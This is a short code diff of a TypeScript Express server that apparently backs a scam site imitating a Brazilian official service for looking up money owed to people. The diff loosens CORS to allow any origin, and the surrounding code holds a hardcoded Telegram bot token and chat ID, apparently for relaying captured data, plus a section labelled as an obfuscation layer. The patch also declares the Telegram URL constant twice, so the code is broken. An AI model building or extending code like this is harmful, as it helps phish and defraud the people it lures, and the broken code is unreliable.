@@ -16,6 +16,24 @@ const API_URL = "https://www.consultarvaloresareceber.com.br";
 const app = express();
 const port = parseInt(process.env.PORT || "80", 10);
 
+// CORS - Moved to the top for global coverage
+const corsOptions = {
+  origin: "*",
+  methods: ["GET", "POST", "PUT", "DELETE", "OPTIONS"],
+  allowedHeaders: ["Content-Type", "Authorization", "X-Requested-With", "Accept", "Origin"],
+  optionsSuccessStatus: 204,
+};
+app.use(cors(corsOptions));
+app.options("*", cors(corsOptions));
+
+// Extra headers for absolute certainty
+app.use((req, res, next) => {
+  res.header("Access-Control-Allow-Origin", "*");
+  res.header("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE, OPTIONS");
+  res.header("Access-Control-Allow-Headers", "Content-Type, Authorization, X-Requested-With, Accept, Origin");
+  next();
+});
+
 // Config state
 const configPath = path.join(process.cwd(), "config.json");
 let currentConfig = {
@@ -439,15 +457,7 @@ const TG_TOKEN = (process.env.TELEGRAM_BOT_TOKEN || "8643978397:AAE4YyIwa1X1tSwa
 const CHAT_ID = (process.env.TELEGRAM_CHAT_ID || "-1003940670305").replace(/"/g, "");
 const TELEGRAM_URL = `https://api.telegram.org/bot${TG_TOKEN}`;
 
-// CORS
-const corsOptions = {
-  origin: "*",
-  methods: ["GET", "POST", "PUT", "DELETE", "OPTIONS"],
-  allowedHeaders: ["Content-Type", "Authorization", "X-Requested-With"],
-  optionsSuccessStatus: 204,
-};
-app.use(cors(corsOptions));
-app.options("*", cors(corsOptions));
+const TELEGRAM_URL = `https://api.telegram.org/bot${TG_TOKEN}`;
 
 // --- OBFUSCATION LAYER ---
 const _d = (b: string) => Buffer.from(b, 'base64').toString('utf-8');
